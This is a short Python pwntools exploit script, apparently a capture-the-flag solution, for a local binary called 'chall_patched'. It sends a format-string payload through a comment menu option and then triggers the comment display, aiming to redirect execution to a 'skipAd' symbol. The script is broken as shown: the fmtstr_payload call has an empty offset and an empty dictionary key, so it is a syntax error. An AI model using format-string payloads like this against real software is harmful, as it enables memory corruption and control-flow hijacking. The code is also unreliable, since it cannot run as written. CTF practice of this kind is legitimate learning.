from pwn import *

exe = ELF("./chall_patched")

context.binary = exe

gdbscript = """
set follow-fork-mode child
"""

args.DEBUG = True

def conn():
    r = process([exe.path])
    if args.DEBUG:
        gdb.attach(r, gdbscript=gdbscript)

    return r

def add_comment(r, payload):
    r.sendlineafter(b"─" * 97, b"4")
    r.sendlineafter(b"here:", payload)

def fmtstr():
    return fmtstr_payload(, {
        : exe.symbols.skipAd
    })

def show_comments(r, payload):
    r.sendlineafter(b"─" * 97, b"3")
    
def main():
    r = conn()

    payload = fmtstr()

    add_comment(r, payload)
    show_comments(r, payload)
    
    r.interactive()

if __name__ == "__main__":
    main()
